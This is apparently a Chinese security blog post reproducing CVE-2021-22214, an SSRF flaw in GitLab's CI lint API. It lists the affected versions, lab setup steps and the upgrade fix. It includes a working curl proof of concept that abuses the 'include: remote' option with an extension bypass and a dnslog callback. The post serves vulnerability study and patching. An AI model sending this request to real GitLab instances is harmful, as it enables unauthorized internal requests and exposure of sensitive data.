<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZAe67rCycsBPqJDqTfwFVw)

**上方蓝色字体关注我们，一起学安全！**

**作者：L0ding****@Timeline Sec  
**

**本文字数：696**

**阅读时长：2～4min**

**声明：仅供学习参考使用，请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

GitLab 是由 GitLabInc. 开发，使用 MIT 许可证的基于网络的 Git 仓库管理工具，具有 issue 跟踪功能。它使用 Git 作为代码管理工具，并在此基础上搭建起来的 web 服务。

**0x02 漏洞概述**  

  

**编号：CVE-2021-22214**  

Gitlab 的 CI lint API 用于验证提供给 gitlab ci 的配置文件是否是 yaml 格式。而根据其说明文档文档，其 include 操作支持 remote 选项，用于获取远端的 yaml。因此在此处将 remote 参数设置为本地回环地址，同时由于后端会检查最后扩展名，加上? test.yaml 即可绕过。  

远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。

**0x03 影响版本**  

  

13.10.5 > GitLab >= 10.5

13.11.5 > GitLab >= 13.11

13.12.2 > GitLab >= 13.12

**0x04 环境搭建**  

  

以阿里云 centos7.3 为例

首先先添加 yum 源，选择 gitlab-ce 社区版

```
curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bash
```

接着需要更新下 yum 缓存  

```
sudo yum makecache
```

接着获取源中的所有版本  

```
yum list gitlab-ce --showduplicates|sort -r
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgF3ptcCOnAAb6vgj2ibMaIyJW9tfDQ8kdSTLMic9jJra7zFnBChranga2hcjiaZsSpuvEbb9q98d3icA/640?wx_fmt=png)

此时选择存在漏洞的版本安装即可

```
yum install gitlab-ce-13.12.1-ce.0.el7
```

下载完成后使用命令 gitlab-ctl reconfigure 即可默认配置安装 gitlab  

**0x05 漏洞复现**  

  

POC 为：（使用时修改两处即可）

```
curl -s --show-error -H 'Content-Type: application/json' http://目标ip或者域名/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://dnslog/api/v1/targets/?test.yml"}'
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaUcPHya2dj8iagWsfOOGhevWXY3DwOyTHibuPPVibOTJKJdic4iaulibeXKMVLas3JibFUIw6HQqeez9WDw/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaUcPHya2dj8iagWsfOOGhevJibPCRDr9NmIkvWCwqRHkPSX3bRicXgkERks77jeffju7vyKA0hoaf3w/640?wx_fmt=png)  

**0x06 修复方式**  

  

当前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本：

https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行